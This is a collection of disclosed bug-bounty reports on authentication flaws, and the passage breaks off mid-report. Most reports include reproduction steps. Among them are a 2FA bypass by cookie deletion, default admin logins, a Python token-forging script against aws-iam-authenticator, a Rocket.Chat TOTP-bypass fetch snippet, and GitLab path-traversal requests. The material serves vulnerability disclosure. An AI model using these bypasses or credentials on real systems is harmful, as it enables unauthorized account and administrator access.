- **Program:** Drugs.com
- **Reporter:** @akhan8041
- **Bounty:** - usd
- **Disclosed:** 2024-06-16T11:39:26.195Z
- **CVE(s):** -

**Vulnerability Information:**

The application has a functionality of 2FA by email OTP so i can bypass that 2FA and got the access of application without having any access of victim account. when a user try to login in the application and enter username and password, the 2FA page is available and application generate all the cookies like "PHPSESSID" or "bb_sessionhash"  at same time at 2FA page that is responsible for the user session but there is a cookie named "bb_refresh" if i delete that cookie and refresh the page again then i can successfully login to the application without 2FA. 

## POC:
1. Login with correct username and password
2. Right click and open inspect element and go to application tab 
3. Select Cookie form the left panel and select drugs.com
4. Delete the cookie named "bb_refresh"
5. Now refresh the page again and Boom !  You Logged In !

████████

## Impact

A 2FA bypass in a web application compromises user security, allowing unauthorized access. Attackers can exploit this vulnerability to gain control over accounts, leading to potential data breaches, privacy violations, and unauthorized actions.

---

### [Improper Authentication (Login without Registration with any user) at ████](https://hackerone.com/reports/2334420)

- **Report ID:** `2334420`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @archyxsec
- **Bounty:** - usd
- **Disclosed:** 2024-03-22T17:50:41.409Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team!

I found a security issue in ███████. An attacker could login as a any user without registration in the page and above all it can change the session of a victim and authenticate him as any user. 

The problem is at the endpoint  ██████████ which, thanks to the **signin** parameter, allows to authenticate anyone with any user.

## Impact

Authentication bypass (Login as any user without authentication)
Force a victim to change session with other user

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to ██████████
2. To check the authentication bypass go to ████:

███

As the link corresponds to a GET request you can force any user to log out and authenticate to any other account.

Additional bonus: *clientid and clientsecret are stored in the page source*

███████

## Suggested Mitigation/Remediation Actions

---

### [Attacker can Add itself as admin user and can also change privileges of Existing Users [█████████]](https://hackerone.com/reports/2354136)

- **Report ID:** `2354136`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @dishant_singh
- **Bounty:** - usd
- **Disclosed:** 2024-03-22T17:43:14.390Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,
i have found a vulnerability on you [domain](████). After directory bruteforcing i found an directory without having any kind of protection and authentication. so an attacker can add new user to the site As **Admin** and an attacker can also change privilege of the users without any authentication. for further read steps to reproducue.

## Impact

The attacker can add itself as admin user and can also change user privileges without any authentication. this can lead to huge impact the entire site can be compromised.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Visit ████████:1:0:::::  you will see the website is asking to login 
2. Now change the **1 to 9** or directly visit this [url](██████████:::::).
3. Navigate to `Add New User`
4. enter email  address, First name, Last name and choose agency to Non-Agency.
5. Click on `add new user`
6. check mail inbox you will recieve the username and password for the admin account you just created. 
7. Login with the creds you just got in you email.



**NOTE: I CREATED 2 ACCOUNTS WHILE TESTING THIS ISSUE I HAVE PROVIED CREDS FOR THE BOTH ACCOUNT IN POC MAKE SURE TO CHECK THEM AS WELL**

## Suggested Mitigation/Remediation Actions
the website should have proper authentication for the url ████████::::: so that can any unauthorized user cannot add user or change the privileges of the existing users.

---

### [Jenkins server access due to weak password](https://hackerone.com/reports/2139047)

- **Report ID:** `2139047`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** IBM
- **Reporter:** @bugoverflow
- **Bounty:** - usd
- **Disclosed:** 2024-02-29T15:18:43.837Z
- **CVE(s):** -

**Summary (team):**

Jenkins server access due to weak password was reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [default credentials at https://52.42.105.71/](https://hackerone.com/reports/2160178)

- **Report ID:** `2160178`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Trellix
- **Reporter:** @forcedrofes
- **Bounty:** - usd
- **Disclosed:** 2024-02-01T16:13:20.093Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

hi team i able to login in one of your servers by default credentials

## Steps to reproduce:
1.go to link : https://52.42.105.71/
1.enter this credentials
```
password=admin
username=admin
```

## PoC

{F2703747}

{F2703748}

## How to remediate the vulnerability

Change the password of the user or disable the account

## Impact

the website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials.

---

### [Critical Unauthenticated Access to Sensitive Employee and Customer Data Including Invoice Details at ████](https://hackerone.com/reports/2262554)

- **Report ID:** `2262554`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Mars
- **Reporter:** @skoll101
- **Bounty:** - usd
- **Disclosed:** 2024-01-30T19:42:33.278Z
- **CVE(s):** -

**Summary (team):**

Summary: During a reconnaissance phase, a directory named 'SSO' was discovered on the website ████████. Upon accessing this directory, it redirected to ██████████ , where sensitive employee and customer data, including usernames, emails, purchase history, payment history, bills, phone numbers, customer numbers, credit card numbers, and invoice details, were found to be accessible without requiring any authentication. Additionally, the system logged the user in automatically without the need for authentication. Notably, the vulnerability is associated with the redirection from the 'SSO' directory to '██████████ .'

---

### [Unauthenticated Jenkins instance exposed information related to █████](https://hackerone.com/reports/2178941)

- **Report ID:** `2178941`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ashutosh7
- **Bounty:** - usd
- **Disclosed:** 2024-01-26T18:55:52.109Z
- **CVE(s):** -

**Vulnerability Information:**

Affected URLs - ██████████blue/organizations/jenkins/pipelines
████████


██████████

████

Also notice that the information is transmitted in clear text as the server is running on HTTP.

## Impact

An attacker can read or edit sensitive information belonging to █████ by abusing this vulnerability.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to ███████ , and other sections. It is exposing information related to ███

## Suggested Mitigation/Remediation Actions
It is recommended to Implement authentication on this Jenkins instance

**Summary (researcher):**

An unauthenticated Jenkins instance hosted in AWS GovCloud exposed some information regarding US Department of Defense. The DOD team promptly acknowledged and fixed this issue.

---

### [Accessing apps protected via ZT's Access when user account is deleted/disabled even after clearing user session/seat](https://hackerone.com/reports/2122690)

- **Report ID:** `2122690`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @matured_kazama
- **Bounty:** - usd
- **Disclosed:** 2023-10-25T15:02:46.072Z
- **CVE(s):** -

**Summary (team):**

When a user account is deleted/disabled at IdP level (for example, when an employee leaves the company), if that user a) preserved some metadata of his Access JWT and b) had access to another active user account (that may or may not have access to any apps) inside the same organisation, due to lack of server-side validation of certain checks, this user would have been able to access SaaS apps despite not being privileged enough to do so. Cloudflare's Engineering team resolved the issue by implementing the necessary server-side validation checks. It is important to note that given the exploitability requirements, the likelihood of this attack was considered low.

---

### [Improper Authentication inside the Rockstar Games Launcher which leads to Account takeover to some extend](https://hackerone.com/reports/1442783)

- **Report ID:** `1442783`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Rockstar Games
- **Reporter:** @j4ck_d4niels
- **Bounty:** 750 usd
- **Disclosed:** 2023-07-05T19:36:17.053Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher described a method for gaining access to a victim's Social Club account on Rockstar Games Launcher under the following conditions:

1. The attacker had already gained access to the victim's Steam or Epic Games account,
2. The victim had linked their Steam or Epic account with their Social Club account,
3. The victim owned a Rockstar Games game on Steam or Epic.

When all the above conditions were met, the attacker would be able to gain access to the victim's Social Club profile within Rockstar Games Launcher via the Switch Account feature when attempting to launch the Steam/Epic game. This could result in account theft and abuse.

To resolve this issue, we implemented and enabled enforcement of an additional auth token that verifies whether or not a user has recently signed in as the account they are attempting to switch to; if not, the user is prompted to log out and re-enter their credentials.

---

### [Ability to join an arbitrary workspace by utilizing a proxy to manipulate invite links](https://hackerone.com/reports/1716016)

- **Report ID:** `1716016`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Slack
- **Reporter:** @hunter0xp7
- **Bounty:** - usd
- **Disclosed:** 2023-06-23T20:38:56.299Z
- **CVE(s):** -

**Summary (team):**

A software bug was found where experienced researchers could utilize an intercepting proxy to repeat HTTP requests to the endpoint api/signup.createUser, replacing the team ID parameter with an arbitrary team ID from the one-time password email generated by a workspace invitation, inviting themselves to a different workspace than the original invitation. This was possible only for workspaces that did not require admin approval to send invitations to join.

Slack launched an investigation of this issue immediately, deploying a fix the same day. We performed a comprehensive impact assessment and concluded that no customers were impacted by this issue.

---

### [response manipulation leads to bypass in register at employee website than 0 click account takeover](https://hackerone.com/reports/1994227)

- **Report ID:** `1994227`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** IBM
- **Reporter:** @ro0od
- **Bounty:** - usd
- **Disclosed:** 2023-06-21T14:08:53.260Z
- **CVE(s):** -

**Summary (team):**

Registration bypass leading to account takeover was reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [Bypass validation parts in AWS IAM Authenticator for Kubernetes](https://hackerone.com/reports/1580493)

- **Report ID:** `1580493`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Kubernetes
- **Reporter:** @0ria
- **Bounty:** 2500 usd
- **Disclosed:** 2023-05-25T12:37:58.089Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Whenever the aws-iam-authenticator server gets a POST request to /authenticate it extracts the token and validates it. The token's content is a signed AWS STS request to the GetCallerIdentity endpoint, where the response content is used to map to matching K8s identity (username, groups).

I found several bypasses to validation parts in [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator):
1. It is possible to craft a token **without signed cluster ID header** and use it for replay attacks.
2. It is possible to manipulate the extracted **AccessKeyID**. Since the AccessKeyID value [can be used as part of the identity](https://github.com/kubernetes-sigs/aws-iam-authenticator#:~:text=%23%20If%20unalterable%20identification%20of%20an%20IAM%20User%20is%20desirable%2C%20you%20can%20map%20against%0A%20%20%23%20AccessKeyID.), it allows an attacker to gain hight permissions in the cluster.
3. It is possible to send a request to other action values (not only GetCallerIdentity). Since I couldn't find a way to control the host or add other parameters to the request, the impact of changing the action is low.

## Kubernetes Version:
all versions

## Component Version:
all versions. the issue seems to be there from [first commit](https://github.com/kubernetes-sigs/aws-iam-authenticator/commit/aeac2587d437da3751f3be8eb9a79a8311d33dd1#diff-b03d5162238d36a569ac0c110484bf356f617e22967aeb1af853b02993da60b8R141).

## Steps To Reproduce:
1. Create a K8s cluster with [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator) as auth webhook.
(I run the aws-iam-authenticator server locally on my machine using the command `aws-iam-authenticator server -c config.yaml`)
2. You can use the python script below to generate all types of malicious tokens. change the CLUSTER_ID value before running.

```python
import base64
import boto3
import re
from botocore.signers import RequestSigner

REGION = 'us-east-1'
CLUSTER_ID = 'gaf-cluster'


def get_bearer_token(url, headers):
    STS_TOKEN_EXPIRES_IN = 60
    session = boto3.session.Session()

    client = session.client('sts', region_name=REGION)
    service_id = client.meta.service_model.service_id

    signer = RequestSigner(
        service_id,
        REGION,
        'sts',
        'v4',
        session.get_credentials(),
        session.events
    )

    params = {
        'method': 'GET',
        'url': url,
        'body': {},
        'headers': headers,
        'context': {}
    }

    signed_url = signer.generate_presigned_url(
        params,
        region_name=REGION,
        expires_in=STS_TOKEN_EXPIRES_IN,
        operation_name=''
    )

    return signed_url


def base64_encode_no_padding(signed_url):
    base64_url = base64.urlsafe_b64encode(signed_url.encode('utf-8')).decode('utf-8')

    # remove any base64 encoding padding:
    return 'k8s-aws-v1.' + re.sub(r'=*', '', base64_url)


def create_mal_token_with_other_action(action_name):
    url = f'https://sts.{REGION}.amazonaws.com/?Action={action_name}&Version=2011-06-15&action=GetCallerIdentity'
    headers = {'x-k8s-aws-id': CLUSTER_ID}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace(f'&action=GetCallerIdentity', '')
    signed_url += f'&action=GetCallerIdentity'

    return base64_encode_no_padding(signed_url)


def create_mal_token_without_cluster_id_header_signed():
    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-signedheaders=x-k8s-aws-id'
    headers = {}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace('&x-amz-signedheaders=x-k8s-aws-id', '')
    signed_url += '&x-amz-signedheaders=x-k8s-aws-id'

    return base64_encode_no_padding(signed_url)


def create_mal_token_with_other_access_key(value):
    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-credential={value}'
    headers = {'x-k8s-aws-id': CLUSTER_ID}
    signed_url = get_bearer_token(url, headers)

    signed_url = signed_url.replace(f'&x-amz-credential={value}', '')
    signed_url += f'&x-amz-credential={value}'

    return base64_encode_no_padding(signed_url)


print("Token with other action:")
print(create_mal_token_with_other_action('GetSessionToken'))

print("Token without cluster id header signed:")
print(create_mal_token_without_cluster_id_header_signed())

print("Token with other value as access key:")
print(create_mal_token_with_other_access_key('some-other-value'))
``` 

3. Choose a token and send the HTTP request below to the aws-iam-authenticator server:
```
POST /authenticate HTTP/1.1
Host: 127.0.0.1:21362
Content-Length: 563

{"Spec":{"Token":"<token-value>"}}
```
Note: You might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times. the reason is explained in the root cause section.

4. View the output of the server and the request:
* If you chose the "other action" token, if the action is valid STS action (such as GetSessionToken) the server will log the following error message: 
*"sts getCallerIdentity failed: arn '' is invalid: 'arn: invalid prefix'".*
If the action is invalid STS action (such as CreateUser) the server will log the following error message:
*"sts getCallerIdentity failed: error from AWS (expected 200, got 400). Body: {\"Error\":{\"Code\":\"InvalidAction\",\"Message\":\"Could not find operation CreateUser for version 2011-06-15\",\"Type\":\"Sender\"},\"RequestId\":\"0037e282-007f-453c-0017-a0acde0b9b00\"}"*

* If you chose the "no signed cluster id header" token, the server will act regularly and will map the arn from the STS response. Note that if requests are being passed through burp, you can send the STS request that was sent by the server to the repeater and delete the "X-K8s-Aws-Id" header and its value.

* If you chose the "other value as access key", the server will log the injected value as the access key "accesskeyid=some-other-value"
In this case, it is possible to trick the mapping. Create the following mapping in the aws-iam-authenticator server config:
```yaml
  mapUsers:
  - userARN: arn:aws:iam::000000000000:user/Alice
    username: user:{{AccessKeyID}}
    groups:
    - test
```
Resent the request with the token and the server will respond with:
```json
{"metadata":{"creationTimestamp":null},"spec":{},"status":{"authenticated":true,"user":{"username":"user:some-other-value","uid":"aws-iam-authenticator:<aws-account-id>:<aws-user-id>","groups":["test"],"extra":{"accessKeyId":["some-other-value"],"arn":["arn:aws:iam::<aws-account-id>:user/<aws-username>"],"canonicalArn":["arn:aws:iam::<aws-account-id>:user/<aws-user-name>"],"sessionName":[""]}}}}
```
The final K8s username was controlled by the attacker.

## Root Cause:
All the specified issues happens because of [this code line](https://github.com/kubernetes-sigs/aws-iam-authenticator/blob/master/pkg/token/token.go#L483)
```go
	for key, values := range queryParams {
		if !parameterWhitelist[strings.ToLower(key)] {
			return nil, FormatError{fmt.Sprintf("non-whitelisted query parameter %q", key)}
		}
		if len(values) != 1 {
			return nil, FormatError{"query parameter with multiple values not supported"}
		}
		queryParamsLower.Set(strings.ToLower(key), values[0])
	}
```
It allows an attacker to send two variables with the same name (but with different uppercase, lowercase characters). For example "Action" and "action".
Since both are being "ToLower", the value in the queryParamsLower dictionary will be overriden while the request to AWS will be sent with both values (sts.amazonaws.com will ignore the other parameter).

Because the for loop is not ordered, the parameters are not always overriden in the order we want, therefore we might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times.

## Impact

An attacker can bypass parts in the authentication and authorization checks that might control the values of the K8s *username* and *groups* during the mapping. This can help an attacker to gain higher permissions in the K8s cluster.

---

### [Subdomain Takeover Affecting at  vex.weather.com](https://hackerone.com/reports/1954364)

- **Report ID:** `1954364`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** IBM
- **Reporter:** @gdattacker
- **Bounty:** - usd
- **Disclosed:** 2023-05-10T13:11:46.433Z
- **CVE(s):** -

**Summary (team):**

Hi @gdattacker 
Improper Authentication was discovered and reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [Authentication Bypass Using Default Credentials on █████](https://hackerone.com/reports/1839012)

- **Report ID:** `1839012`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hack3ron___1
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T18:38:39.183Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
I have found a vulnerability name authentication Bypass Using Default Credentials on admin console of █████████.

## Impact

Access to the portal and the data in the portal like emails links data etc

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Steps:
1. Go to ████████
2. Then login with credentials username admin and password admin.

## Suggested Mitigation/Remediation Actions
Change the credentials

---

### [Access to tomcat-manager with default creds](https://hackerone.com/reports/1267174)

- **Report ID:** `1267174`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** JetBlue
- **Reporter:** @0xjackal
- **Bounty:** - usd
- **Disclosed:** 2023-02-05T12:59:44.752Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi jetblue Security Team.

I Found that this domain `█████████` using Apache Tomcat/6.0.35 , And i was able to login to https://██████████/manager/html With default credentials `tomcat:tomcat`
See the following Screenshots:-

██████████

███

## Steps To Reproduce:
1. Go To https://███████/manager/html
2. Login with default creds `tomcat:tomcat`

## Supporting Material/References:
- https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat

## Impact

Improper Authentication
Default Credentials lead to access admin manager.

##Fix:-
- Change default creds.

---

### [Security Issue into Wallet lock protection ](https://hackerone.com/reports/1792544)

- **Report ID:** `1792544`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Hiro
- **Reporter:** @bug_vs_me
- **Bounty:** - usd
- **Disclosed:** 2023-01-11T13:17:23.226Z
- **CVE(s):** -

**Vulnerability Information:**

# Description

While testing wallet extension i generally try to test multiple endpoints, so 2 tabs were open of wallet on chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/popup.html


So i tried to lock Wallet extension buti found that i can still use browser in 2nd tab, why i had already locked wallet,


So there is a security issue where wallet is not properly encrypted after user press lock

Wallet should close all open tabs of wallets and encrypt data for all tabs, It's very insecure way of password protection or lock protection


# Steps To reproduce

To understand clearly i had created a POC video 
{F2061644}

1. Open two tabs of chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/popup.html
2. lock wallet in any of 1 tab and you can see you can access wallet on other tab and still able to do transaction as shown in POC{F2061648}


# HOW to fix?

Edit code and make sure when user click on lock wallet wallet should encrypt data in all tabs or close rest of the tabs to protect user and make lock protection work more securely

Thank you

## Impact

This is totally fail of lock protection AND attacker can use this vulnerability to craft custom attacks

---

### [Otp  bypass in verifying nin](https://hackerone.com/reports/1314172)

- **Report ID:** `1314172`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** MTN Group
- **Reporter:** @mr_sparrow
- **Bounty:** - usd
- **Disclosed:** 2022-10-17T06:27:51.044Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

while conducting my research in your website I found that while verifying NIN number it send the otp to the enterd mobile number that can be bypassed.

## Steps To Reproduce:

1) Go to https://nin.mtnonline.com/nin/
2) click submit nin.Now it will redirect to another page https://nin.mtnonline.com/nin/
3) It asks for mobile number and National Identity Number [NIN].
4) Enter the mobile and NIN number and click Next.It will send the otp to the mobile number.
5) Enter any 6 digit code and click verify and capture the request in bupsuite and click action and select "Do intercept and response to the request"
6) Now change the response status to success.
------>Now successfully verified mobile number.

## Impact

The attacker can able to verify NIN with any number.


Note: I had attached the poc video below please take a look.


Regards,
@aaruthra.

---

### [Account takeover on ███████ [HtUS]](https://hackerone.com/reports/1627961)

- **Report ID:** `1627961`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nightm4re
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T13:05:24.465Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
I have found an endpoint in ████████ is vulnerable to Account takeover

Steps to reproduce:
1. Create 2 accounts ( Attacker ( A ) and vicitm ( B ) )
2. Log in to all of them and go to https://███████/███████/EditUserProfile with attacker's account
3. Now fill out the password with your password 
4. Change the attacker's attacker@gmail.com email with victim's email victim@gmail.com
5. Click Submit button and forward the request to repeater
6. Now if the vicim tried to log into his account, he will facing an error
7. Back to the request go to repeater and change the User id of the attacker with the vicim's user ID ( You probley need to brute-force it )
8. Forward the request and you will see 302 code response
9. Stay in the request and change back all changes ( EMAIL and USER ID of Attacker ) and send the request again
9. Now try to log into the victim's victim@gmail.com account with your password
10. You will be logged in



POC:
	████

## Impact

An attacker can takeover accounts

**Summary (researcher):**

By changing the attacker's email and ID to the existing victim's email, it can be abused and taken over the victim's account.

---

### [TOTP 2 Factor Authentication Bypass](https://hackerone.com/reports/1448268)

- **Report ID:** `1448268`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2022-09-22T16:02:53.014Z
- **CVE(s):** CVE-2022-35248

**Summary (team):**

## Summary

Two Factor Authentication can be bypassed when telling the server to use CAS during login.

 ## Description

The 2FA Login Handler skips validation when it finds CAS enabled. When the clients sends the option among the login request, the login proceeds without validation of a second factor.

In [app/2fa/server/loginHandler.js#L17-L42](https://github.com/RocketChat/Rocket.Chat/blob/c688917ad1cc95087a50c3d4d507a1669e60eec0/app/2fa/server/loginHandler.js#L17-L42) there is a return condition when the `cas` argument is not falsy:

```javascript
callbacks.add(
	'onValidateLogin',
	(login) => {
		if (login.type === 'resume' || login.type === 'proxy' || login.methodName === 'verifyEmail') {
			return login;
		}

		const [loginArgs] = login.methodArguments;
		// CAS login doesn't yet support 2FA.
		if (loginArgs.cas) {
			return login;
		}

		const { totp } = loginArgs;

		checkCodeForUser({
			user: login.user,
			code: totp && totp.code,
			options: { disablePasswordFallback: true },
		});

		return login;
	},
	callbacks.priority.MEDIUM,
	'2fa',
);
```

## Releases Affected:

  * 4.3.1
  * 3.18.3
  * develop

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create User account with 2FA enabled
  2. Logout and open Rocket.Chat login page
  3. Open Web Inspector
  4. Paste Proof of Concept (set valid USER/PASSWORD of an account with 2FA enabled)

## Supporting Material/References:

### Proof of Concept

```javscript
const USER = "target";
const PASSWORD = "correct horse battery staple";

fetch("/api/v1/login", {
	method: "POST",
	body: `{
		"cas": true,
		"totp": {
			"code": "Not Today",
			"type": "resume",
			"login": {
				"user": {
					"username": "${USER}"
				},
				"password": "${PASSWORD}"
			}
		}
	}`,
	headers: {
		"Content-Type": "application/json"
	}
})
.then(res => res.json())
.then(({ data: { userId, authToken }}) => {
	console.log(`login as ${userId}`);
	Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);
	Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);
	window.location.reload()
});
```

## Suggested mitigation

  * Check on server side whether CAS is enabled and do not only trust the client.
  * Inform administrators in the UI that CAS conflicts 2FA authentication

## Impact

Bypass of 2FA TOTP authentication.

## Fix
Fixed in versions 4.7.5, 4.8.2, 5.0.0>

---

### [Response Manipulation leads to Admin Panel Login Bypass at https://██████/](https://hackerone.com/reports/1508661)

- **Report ID:** `1508661`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Sony
- **Reporter:** @amanr1337
- **Bounty:** - usd
- **Disclosed:** 2022-09-12T19:00:32.808Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that the authentication of a Sony endpoint could be bypassed by manipulating the response to a login request. By changing the value of a response parameter, the researcher bypassed the authentication and was able to gain access to an admin portal.

---

### [Insecure Object Permissions for Guest User leads to access to internal documents!](https://hackerone.com/reports/1089583)

- **Report ID:** `1089583`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** IBM
- **Reporter:** @mocr7
- **Bounty:** - usd
- **Disclosed:** 2022-07-15T17:40:46.974Z
- **CVE(s):** -

**Summary (team):**

An Insecure Object Permissions vulnerability was reported to IBM, analyzed and have been remediated. Thank you to mocr7.

---

### [Exposure of a valid Gitlab-Workhorse JWT leading to various bad things](https://hackerone.com/reports/1040786)

- **Report ID:** `1040786`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** GitLab
- **Reporter:** @ledz1996
- **Bounty:** - usd
- **Disclosed:** 2022-07-05T16:28:24.784Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

Using the **State** Uploading API we could potentially do a bad thing:
- Bypass `Gitlab::Workhorse.verify_api_request!`

This was due to the fact that Workhorse clean the URL before passing it to Rails, this is elaborated in #923027. 
and **State** Api read `request.body` to append it as a file!

**lib/api/terraform/state.rb**
```ruby
 desc 'Add a new terraform state or update an existing one'
          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth
          post do
            authorize! :admin_terraform_state, user_project

            data = request.body.read
```
There is one very interestingly specific exploit which I've found in my researching on Geo is to un-authorizing push to any readable repository
Since Gitlab has a pre-receive hook which check the permission even if attacker is able to bypass the Access Control in Rails part but here is pretty interesting stuff in EE:

**ee/app/controllers/ee/repositories/git_http_controller.rb**
```ruby
def user
        super || geo_push_user&.user
      end

      def geo_push_user
        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)
      end
```
Which mean the `user` for passing to Gitaly will be `user` from `geo_push_user`

```ruby
  def self.new_from_headers(headers)
    return unless needed_headers_provided?(headers)

    new(headers['Geo-GL-Id'])
  end

  def user
    @user ||= identify_using_ssh_key(gl_id)
  end
```

Tracing from this we will reach here

```ruby
    def identify_using_ssh_key(identifier)
      key_id = identifier.gsub("key-", "")

      identify_with_cache(:ssh_key, key_id) do
        User.find_by_ssh_key_id(key_id)
      end
    end

```
This means: I am able to authenticate as any **SSH-KEY** by just passing the ID of the Key to headers `Geo-GL-Id`

### Steps to reproduce

Spliting into 2 parts, **GEO** is not neccessary for the PoC but **EE** Plan should be.

**Exposing Gitlab JWT**

- Set up an Project
- Get a Personal Access Token of the user
- Send the following request 

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Private-Token: <private-token>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all
Upgrade-Insecure-Requests: 1
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="mirror"; filename=test.txt
Content-Type: image/jpg

true
------WebKitFormBoundaryTdc8IV2vpQMwv6jW--
```

3. Later on send the following request 

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Private-Token: <Private-Token>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all
Upgrade-Insecure-Requests: 1

```

You will then receive something like this which the JWT is in `mirror.gitlab-workhorse-upload` parameter

```http
